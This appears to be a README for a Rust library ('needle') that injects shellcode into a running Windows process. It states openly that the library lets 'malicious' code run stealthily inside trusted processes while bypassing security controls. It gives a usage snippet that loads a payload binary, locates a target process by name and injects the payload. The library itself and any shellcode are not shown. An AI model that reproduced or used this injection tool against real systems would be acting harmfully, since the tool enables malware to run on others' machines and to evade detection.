# Rust Process Injection (Windows Only)

> Process injection is a technique used to execute arbitrary code in the address space of a separate live process. It is commonly used in both legitimate applications, such as debugging tools, and malicious activities, such as malware attacks. The main goal of process injection is to manipulate the target process to run the injected code with the same permissions and context as the original process, often to evade detection and security measures.

Allows for running "malicious" code stealthily within the context of trusted processes, bypassing security controls. 

## How to use:
```RUST
use needle::{find_process, inject, Payload};

const SHELL_CODE: &[u8] = include_bytes!("YOUR_PAYLOAD.bin");

fn main() {
    let payload = Payload::from(SHELL_CODE);
    let process = find_process("YOUR_TARGET_PROCESS.exe").expect("Target process not found");
    if let Err(e) = inject(process, payload) {
        println!("Could not inject payload: {}", e);
    }
}
```
